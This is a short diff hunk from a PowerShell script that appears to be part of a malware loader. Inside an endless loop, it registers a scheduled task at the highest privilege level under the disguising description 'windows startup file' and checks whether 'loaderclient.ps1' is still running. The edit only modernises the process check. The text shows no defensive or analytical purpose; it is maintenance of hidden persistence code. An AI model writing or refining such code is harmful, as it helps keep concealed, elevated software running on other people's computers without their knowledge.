@@ -6,11 +6,11 @@ while ($true) {
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
 
-    $processes = wmic process get CommandLine,Name | Select-String "powershell"
+    $processes = Get-CimInstance Win32_Process | Where-Object { $_.Name -like "powershell*" }
     $found = $false
 
     foreach ($proc in $processes) {
-        if ($proc -match "loaderclient.ps1") {
+        if ($proc.CommandLine -match "loaderclient.ps1") {
             $found = $true
             break
         }
